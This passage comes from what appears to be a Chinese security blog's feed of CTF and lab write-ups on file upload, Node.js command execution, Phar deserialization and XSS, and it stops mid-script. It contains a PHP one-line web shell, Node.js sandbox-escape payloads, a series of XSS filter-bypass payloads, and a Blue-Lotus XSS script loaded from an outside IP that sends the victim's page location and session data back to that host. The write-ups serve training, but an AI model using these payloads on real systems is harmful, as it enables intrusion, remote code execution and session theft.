this! </span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>要传🐎，但是路径是&#x2F;tmp<br>考虑软连接</p><p>要创建软链接，可以使用ln -s命令，其基本语法如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s [源文件或目录] [目标文件或目录]</span><br></pre></td></tr></table></figure></div><p>注意：在指定源文件或目录和目标文件或目录时，不要在路径后面加上斜杠(&#x2F;)。例如，要在当前目录下创建一个指向&#x2F;var&#x2F;www&#x2F;test目录的软链接test，可以执行：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/test test</span><br></pre></td></tr></table></figure></div><p>如果要在&#x2F;var目录下创建一个指向&#x2F;var&#x2F;www&#x2F;test的软链接test，则执行：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/test /var/test</span><br></pre></td></tr></table></figure></div><p>于是,我们创建一个指向&#x2F;www&#x2F;html&#x2F;的软连接&#x2F;tmp&#x2F;test</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/html /tmp/test</span><br></pre></td></tr></table></figure></div><p>压缩为zip传上去</p><p>🐎mama.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[a]);?&gt;</span><br></pre></td></tr></table></figure></div><p>路径为&#x2F;test&#x2F;mama.php压缩为zip</p><p>访问mama.php开始找flag<br>flag在&#x2F;flag下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="upload" scheme="http://example.com/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>nodejs执行命令</title>
    <link href="http://example.com/2025/03/24/web/nodejs/nodejs/"/>
    <id>http://example.com/2025/03/24/web/nodejs/nodejs/</id>
    <published>2025-03-24T20:49:52.000Z</published>
    <updated>2025-04-05T11:38:59.691Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>以下是 <strong>Node.js 中执行系统命令的各种方法</strong> 的详细介绍，包括适用场景、实现方式和安全注意事项：</p><hr><h2 id="1-child-process-exec（标准方式）"><a href="#1-child-process-exec（标准方式）" class="headerlink" title="1. child_process.exec（标准方式）"></a><strong>1. <code>child_process.exec</code>（标准方式）</strong></h2><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>常规 Node.js 环境下执行 Shell 命令。</li><li>适用于需要获取命令输出或错误信息的场景。</li></ul><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="title function_">exec</span>(<span class="string">&#x27;ls -la&#x27;</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Output: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ <strong>标准方法</strong>，官方推荐。<br>✅ 可以获取命令的 <strong>完整输出</strong>（<code>stdout</code>&#x2F;<code>stderr</code>）。<br>❌ 如果用户输入未过滤，可能导致 <strong>命令注入（RCE）</strong>。  </p><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>使用 <code>execFile</code>（避免 Shell 解析）：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">execFile</span>(<span class="string">&#x27;ls&#x27;</span>, [<span class="string">&#x27;-la&#x27;</span>], <span class="function">(<span class="params">error, stdout</span>) =&gt;</span> &#123; ... &#125;);</span><br></pre></td></tr></table></figure></div></li><li>对用户输入进行 <strong>严格过滤</strong>（如白名单校验）。</li></ul><hr><h2 id="2-process-mainModule-constructor-load（绕过-require-限制）"><a href="#2-process-mainModule-constructor-load（绕过-require-限制）" class="headerlink" title="2. process.mainModule.constructor._load（绕过 require 限制）"></a><strong>2. <code>process.mainModule.constructor._load</code>（绕过 <code>require</code> 限制）</strong></h2><h3 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>某些环境禁用 <code>require</code>，但仍需动态加载模块（如沙箱逃逸）。</li></ul><h3 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> childProcess = <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">childProcess.<span class="title function_">exec</span>(<span class="string">&#x27;恶意命令&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 可以绕过部分 <strong><code>require</code> 限制</strong>。<br>❌ 依赖 <code>global.process</code> 的访问权限。<br>❌ <strong>容易被安全工具检测</strong>（如 WAF）。  </p><h3 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>禁止修改 <code>global.process</code>：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="variable language_">global</span>.<span class="property">process</span>);</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="3-vm-沙箱逃逸（利用漏洞执行命令）"><a href="#3-vm-沙箱逃逸（利用漏洞执行命令）" class="headerlink" title="3. vm 沙箱逃逸（利用漏洞执行命令）"></a><strong>3. <code>vm</code> 沙箱逃逸（利用漏洞执行命令）</strong></h2><h3 id="适用场景-2"><a href="#适用场景-2" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>当代码运行在 <code>vm</code> 沙箱中，但沙箱配置不严格时。</li></ul><h3 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">`</span></span><br><span class="line"><span class="string">  this.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).exec(&#x27;恶意命令&#x27;);</span></span><br><span class="line"><span class="string">`</span>);</span><br><span class="line">script.<span class="title function_">runInNewContext</span>(&#123;&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 可绕过简单沙箱限制。<br>❌ 依赖 <strong>沙箱配置错误</strong>（如未隔离原型链）。<br>❌ 高版本 Node.js 已修复部分漏洞。  </p><h3 id="防御措施-2"><a href="#防御措施-2" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>使用更安全的沙箱（如 <a href="https://github.com/patriksimek/vm2"><code>vm2</code></a>）。</li><li>禁止访问 <code>constructor</code>：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">vm.<span class="title function_">runInNewContext</span>(<span class="string">&#x27;代码&#x27;</span>, &#123;&#125;, &#123; <span class="attr">timeout</span>: <span class="number">1000</span> &#125;);</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="4-process-binding（底层-API）"><a href="#4-process-binding（底层-API）" class="headerlink" title="4. process.binding（底层 API）"></a><strong>4. <code>process.binding</code>（底层 API）</strong></h2><h3 id="适用场景-3"><a href="#适用场景-3" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>需要直接调用 Node.js 底层 C++ 绑定（如 <code>spawn_sync</code>）。</li></ul><h3 id="代码示例-3"><a href="#代码示例-3" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">process.<span class="title function_">binding</span>(<span class="string">&#x27;spawn_sync&#x27;</span>).<span class="title function_">spawn</span>(&#123;</span><br><span class="line">  <span class="attr">file</span>: <span class="string">&#x27;bash&#x27;</span>,</span><br><span class="line">  <span class="attr">args</span>: [<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;恶意命令&#x27;</span>],</span><br><span class="line">  <span class="attr">stdio</span>: [<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;pipe&#x27;</span>]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="特点-3"><a href="#特点-3" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 绕过 <code>child_process</code> 模块限制。<br>❌ <strong>依赖 Node.js 版本</strong>（新版可能移除该 API）。<br>❌ 需要进程权限。  </p><h3 id="防御措施-3"><a href="#防御措施-3" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>限制 <code>process.binding</code> 访问：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> process.<span class="property">binding</span>;</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="5-Worker-Threads（多线程执行）"><a href="#5-Worker-Threads（多线程执行）" class="headerlink" title="5. Worker Threads（多线程执行）"></a><strong>5. <code>Worker Threads</code>（多线程执行）</strong></h2><h3 id="适用场景-4"><a href="#适用场景-4" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>在 Worker 线程中隐藏恶意代码。</li></ul><h3 id="代码示例-4"><a href="#代码示例-4" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Worker</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;worker_threads&#x27;</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">`</span></span><br><span class="line"><span class="string">  const &#123; exec &#125; = require(&#x27;child_process&#x27;);</span></span><br><span class="line"><span class="string">  exec(&#x27;恶意命令&#x27;);</span></span><br><span class="line"><span class="string">`</span>, &#123; <span class="attr">eval</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure></div><h3 id="特点-4"><a href="#特点-4" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 可绕过主线程监控。<br>❌ 需要启用 <code>eval: true</code>。<br>❌ 可能被 <strong>进程监控工具</strong> 发现。  </p><h3 id="防御措施-4"><a href="#防御措施-4" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>禁止动态 Worker 代码：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">&#x27;file.js&#x27;</span>); <span class="comment">// 只允许文件加载</span></span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="6-fs-exec（写入脚本后执行）"><a href="#6-fs-exec（写入脚本后执行）" class="headerlink" title="6. fs + exec（写入脚本后执行）"></a><strong>6. <code>fs + exec</code>（写入脚本后执行）</strong></h2><h3 id="适用场景-5"><a href="#适用场景-5" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>当直接执行命令被拦截，但允许写入文件时。</li></ul><h3 id="代码示例-5"><a href="#代码示例-5" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">fs.<span class="title function_">writeFileSync</span>(<span class="string">&#x27;/tmp/exploit.sh&#x27;</span>, <span class="string">&#x27;恶意命令&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;bash /tmp/exploit.sh&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="特点-5"><a href="#特点-5" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 可绕过简单命令黑名单。<br>❌ 依赖 <strong>文件写入权限</strong>。<br>❌ 可能被 <strong>文件监控</strong> 检测。  </p><h3 id="防御措施-5"><a href="#防御措施-5" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>限制临时目录写入权限。</li><li>监控敏感文件创建（如 <code>/tmp/exploit.sh</code>）。</li></ul><hr><h2 id="总结对比表"><a href="#总结对比表" class="headerlink" title="总结对比表"></a><strong>总结对比表</strong></h2><table><thead><tr><th>方法</th><th>适用场景</th><th>绕过能力</th><th>防御措施</th></tr></thead><tbody><tr><td><code>child_process.exec</code></td><td>常规命令执行</td><td>❌</td><td>输入过滤 + <code>execFile</code></td></tr><tr><td><code>process.mainModule._load</code></td><td>绕过 <code>require</code> 限制</td><td>✅</td><td>冻结 <code>global.process</code></td></tr><tr><td><code>vm</code> 沙箱逃逸</td><td>沙箱环境</td><td>✅（需漏洞）</td><td>使用 <code>vm2</code> 沙箱</td></tr><tr><td><code>process.binding</code></td><td>底层 API 调用</td><td>✅</td><td>删除 <code>process.binding</code></td></tr><tr><td><code>Worker Threads</code></td><td>多线程隐藏执行</td><td>✅</td><td>禁用 <code>eval: true</code></td></tr><tr><td><code>fs + exec</code></td><td>文件写入后执行</td><td>✅</td><td>文件监控 + 权限限制</td></tr></tbody></table><hr><h2 id="终极防御建议"><a href="#终极防御建议" class="headerlink" title="终极防御建议"></a><strong>终极防御建议</strong></h2><ol><li><strong>最小权限原则</strong>：Node.js 进程以低权限用户运行。</li><li><strong>输入过滤</strong>：禁止用户输入进入 <code>exec</code>、<code>eval</code> 等。</li><li><strong>依赖检查</strong>：避免使用恶意第三方包（如 <code>npm audit</code>）。</li><li><strong>WAF</strong>：使用 Web 应用防火墙拦截可疑请求。</li><li><strong>沙箱隔离</strong>：敏感操作放在受限环境（如 Docker、<code>vm2</code>）。</li></ol><hr><p>⚠️ <strong>重要提醒</strong>：以上方法仅限 <strong>授权渗透测试</strong>，未经授权使用属 <strong>违法行为</strong>！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="nodejs" scheme="http://example.com/categories/nodejs/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="ai写的" scheme="http://example.com/tags/ai%E5%86%99%E7%9A%84/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化</title>
    <link href="http://example.com/2025/03/20/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2025/03/20/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-03-20T21:10:52.000Z</published>
    <updated>2025-04-05T11:38:59.691Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Phar反序列化是一种利用Phar文件的特性进行攻击的方法。Phar文件是一种压缩文件，类似于Java中的JAR包，Phar文件会以序列化的形式存储用户自定义的meta-data，从而扩展反序列化漏洞的攻击面</p><h2 id="反序列化的条件"><a href="#反序列化的条件" class="headerlink" title="反序列化的条件"></a>反序列化的条件</h2><p>要实现Phar反序列化，需要满足以下几个条件：</p><p>Phar文件能够上传到服务器端：攻击者需要能够将Phar文件上传到目标服务器，以便利用Phar文件中的序列化数据进行反序列化攻击</p><p>存在可利用的魔术方法：Phar文件中的meta-data会在反序列化时被解析，因此需要有可利用的魔术方法（如__destruct、__wakeup等）作为“跳板”，以便在反序列化过程中执行恶意代码</p><p>文件操作函数的参数可控：需要能够控制文件操作函数的参数，并且这些参数中包含特殊字符（如:、&#x2F;、phar等）没有被过滤。这样可以通过Phar伪协议读取并解析Phar文件，从而触发反序列化</p><h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><p>以下是一个简单的Phar文件生成示例：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject &#123;</span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">echo &#x27;Destruct called&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); // 后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 设置stub</span><br><span class="line">$o = new TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o); // 将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); // 添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><p>在生成Phar文件后，可以通过以下代码触发反序列化：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename = &#x27;phar://phar.phar/test.txt&#x27;;</span><br><span class="line">file_get_contents($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><h2 id="重要注意事项"><a href="#重要注意事项" class="headerlink" title="重要注意事项"></a>重要注意事项</h2><p>在进行Phar反序列化攻击时，需要注意以下几点：</p><p>Phar文件的生成：生成Phar文件时，需要将php.ini中的phar.readonly选项设置为Off，否则无法生成Phar文件</p><p>绕过检测 条件竞争等方案来传🐎</p><p>通过满足上述条件，可以在不调用unserialize()函数的情况下实现Phar反序列化攻击，从而执行恶意代码。</p><p><a class="link"   href="https://xz.aliyun.com/news/6303?time__1311=YqIxgD070=BDlhzG7FD8K9P0K4Dv=NdG8AeD&u_atoken=2ce2353c671e67892a58d8137a023870&u_asig=0a472f8c17424763875994781e014c" >这个更详细 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="php反序列化" scheme="http://example.com/categories/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="php伪协议" scheme="http://example.com/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>upload</title>
    <link href="http://example.com/2025/03/19/web/upload/upload/"/>
    <id>http://example.com/2025/03/19/web/upload/upload/</id>
    <published>2025-03-19T13:10:52.000Z</published>
    <updated>2025-04-05T11:38:59.692Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="有时间再写"><a href="#有时间再写" class="headerlink" title="有时间再写"></a>有时间再写</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="upload" scheme="http://example.com/categories/upload/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="upload" scheme="http://example.com/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>xss-lab</title>
    <link href="http://example.com/2025/03/19/web/xss/xss-lab/"/>
    <id>http://example.com/2025/03/19/web/xss/xss-lab/</id>
    <published>2025-03-19T13:10:52.000Z</published>
    <updated>2025-04-05T11:38:59.692Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>没有过滤</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>代码插入””里面</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>代码插入到’’里面<br>而且将符号实体化了</p><p>{onfocus事件在元素获得焦点时触发，最常与 <input>、<select> 和 <a> 标签一起使用，以上面图片的html标签<input>为例，<input>标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码}</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onfocus=javascript:alert() &#x27;</span><br></pre></td></tr></table></figure></div><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt; onfocus=javascript:alert() &lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>onfocus似掉了<br>换一个姿势</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert()&gt;xxx&lt;/a&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>a href也寄掉了，但是没有过滤大小写</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>判断检测到上面的就会自动删除该单词</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;scscriptript&gt;alert()&lt;/scscriptript&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>javascript:alert(“xss”)发现不可以用，&#x2F;&#x2F;注释也不可以用<br>考虑用unioncode编码之后绕过</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;</span><br></pre></td></tr></table></figure></div><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>在8题基础上面添加了检查有没有http:&#x2F;&#x2F;</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;//http://</span><br></pre></td></tr></table></figure></div><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>研究ing</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="XSS" scheme="http://example.com/categories/XSS/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>xss</title>
    <link href="http://example.com/2025/03/19/web/xss/xss/"/>
    <id>http://example.com/2025/03/19/web/xss/xss/</id>
    <published>2025-03-19T13:10:52.000Z</published>
    <updated>2025-04-05T11:38:59.692Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="常见的姿势"><a href="#常见的姿势" class="headerlink" title="常见的姿势"></a>常见的姿势</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;xxx&lt;/a&gt; //添加标签，但是必须要点击标签才有效</span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;image src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;body onload=alert(1)&gt; // 在页面加载完成后执行onload指定的函数</span><br><span class="line">&lt;svg onload=alert(1)&gt; // 在SVG图像加载完成后执行onload指定的函数</span><br><span class="line">&lt;iframe/onload=alert(1)&gt;&lt;/iframe&gt; // &lt;iframe&gt;标签是用于在网页中嵌入其他网页或文档的元素，onload事件是在&lt;iframe&gt;加载完成后触发的事件。</span><br><span class="line">&lt;body onload=&quot;windows.open(&#x27;https://www.baidu.com&#x27;)&quot;&gt; // 加载百度页面</span><br><span class="line"></span><br><span class="line">&lt;body onload=&#x27;console.log(1)&#x27;&gt; // 控制台打印1</span><br><span class="line">&lt;body onload=&#x27;console.info(1)&#x27;&gt;</span><br><span class="line">&lt;body onload=&#x27;console.error(1)&#x27;&gt;</span><br><span class="line">onfocus=javascript:alert()</span><br><span class="line">绕过方法</span><br><span class="line">过滤空格，用/、Tab(%09)或者/**/代替空格，如&lt;body/onload=alert(1)&gt;</span><br><span class="line">过滤alert，用top[&#x27;aler&#x27;+&#x27;t&#x27;]绕过</span><br><span class="line">过滤 alert()，用top[&#x27;aler&#x27;+&#x27;t&#x27;].call 绕过</span><br></pre></td></tr></table></figure></div><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>没有一点过滤</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://47.115.221.235:1234/myjs/niuniu.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p>这是蓝莲花Blue-Lotus自带的脚本</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var website=&quot;http://47.115.221.235:1234/index.php&quot;;</span><br><span class="line">(function()&#123;(new Image()).src=website+&#x27;/?keepsession=1&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return 